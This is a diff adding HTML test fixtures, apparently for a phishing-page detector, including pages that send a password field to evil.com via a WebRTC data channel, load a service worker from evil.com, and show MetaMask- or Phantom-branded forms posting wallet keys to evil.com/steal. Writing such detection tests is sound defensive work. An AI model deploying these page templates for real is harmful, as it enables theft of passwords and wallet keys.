@@ -282,6 +282,92 @@ MINIMAL_HTML = """<html><body><p>Hello world</p></body></html>"""
 BINARY_PNG_HEADER = b"\x89PNG\r\n\x1a\n" + b"\x00" * 100
 BINARY_JPEG_HEADER = b"\xff\xd8\xff\xe0" + b"\x00" * 100
 
+RTC_PEER_EXFIL = """<!DOCTYPE html>
+<html><head><title>Login</title></head>
+<body>
+  <input type="password" id="pw">
+  <script>
+  var pc = new RTCPeerConnection({iceServers: [{urls: "https://evil.com/stun"}]});
+  var dc = pc.createDataChannel("exfil");
+  dc.onopen = function() { dc.send(document.getElementById("pw").value); };
+  </script>
+</body>
+</html>"""
+
+SERVICE_WORKER_EXFIL = """<!DOCTYPE html>
+<html><head><title>Login</title></head>
+<body>
+  <input type="password" id="pw">
+  <script>
+  navigator.serviceWorker.register("https://evil.com/sw.js");
+  </script>
+</body>
+</html>"""
+
+WALLET_BODY_TEXT_PHISHING = """<!DOCTYPE html>
+<html><head><title>Login</title></head>
+<body>
+  <div class="logo"></div>
+  <p>Welcome to MetaMask</p>
+  <p>Please enter your password to continue</p>
+  <input type="password" name="pw">
+  <button>Unlock</button>
+</body>
+</html>"""
+
+WALLET_BRAND_DEEP_IN_TEXT = """<!DOCTYPE html>
+<html><head><title>Crypto News Daily</title></head>
+<body>
+  <h1>Today's Cryptocurrency Market Update and Analysis Report</h1>
+  <p>The cryptocurrency market experienced significant volatility today as Bitcoin surged past the fifty thousand dollar mark. Ethereum also saw gains of over five percent in early trading sessions across major exchanges worldwide. Analysts attribute this movement to increased institutional adoption and favorable regulatory developments in several key markets. Trading volumes on decentralized exchanges reached new highs as retail investors continue to participate in the ongoing bull run. The total cryptocurrency market capitalization has now exceeded two trillion dollars for the first time this quarter. Several altcoins also posted impressive gains with Solana leading the charge among layer one protocols. Industry experts suggest that the current momentum could continue through the end of the quarter barring any major regulatory setbacks or macroeconomic disruptions.</p>
+  <p>In other news, MetaMask users reported minor connectivity issues during peak hours.</p>
+  <form><input type="password" name="admin_pw"><button>Admin Login</button></form>
+</body>
+</html>"""
+
+WALLET_BRAND_REPEATED = """<!DOCTYPE html>
+<html><head><title>Import</title></head>
+<body>
+  <div>MetaMask Recovery Tool</div>
+  <div>Use MetaMask to manage your crypto</div>
+  <div>MetaMask is the most popular wallet</div>
+  <input type="password" name="key">
+  <button>Import</button>
+</body>
+</html>"""
+
+IFRAME_DATA_URI_PHISHING = """<!DOCTYPE html>
+<html><head><title>Redirect</title></head>
+<body>
+<p>Loading...</p>
+<iframe src="data:text/html;base64,PCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+PHRpdGxlPlBoYW50b208L3RpdGxlPjwvaGVhZD48Ym9keT48aDE+UGhhbnRvbTwvaDE+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJrZXkiPjxidXR0b24+SW1wb3J0PC9idXR0b24+PC9ib2R5PjwvaHRtbD4="></iframe>
+</body>
+</html>"""
+
+IFRAME_SRCDOC_PHISHING = """<!DOCTYPE html>
+<html><head><title>Loading</title></head>
+<body>
+<iframe srcdoc="<h1>Phantom</h1><input type='password' name='key'><button>Import</button>"></iframe>
+</body>
+</html>"""
+
+JS_RENDERED_PHISHING_SHELL = """<!DOCTYPE html>
+<html><head><title>Loading...</title></head>
+<body>
+<div id="app"></div>
+<script>
+document.getElementById('app').innerHTML = '<h1>MetaMask</h1><form action="https://evil.com/steal"><input type="password" name="key"><button>Import</button></form>';
+</script>
+</body>
+</html>"""
+
+JS_RENDERED_PHISHING_DOM = """<!DOCTYPE html>
+<html><head><title>Loading...</title></head>
+<body>
+<div id="app"><h1>MetaMask</h1><form action="https://evil.com/steal"><input type="password" name="key"><button>Import</button></form></div>
+</body>
+</html>"""
+
 MICROSOFT_PHISHING = """<!DOCTYPE html>
 <html>
 <head><title>Sign-In</title></head>
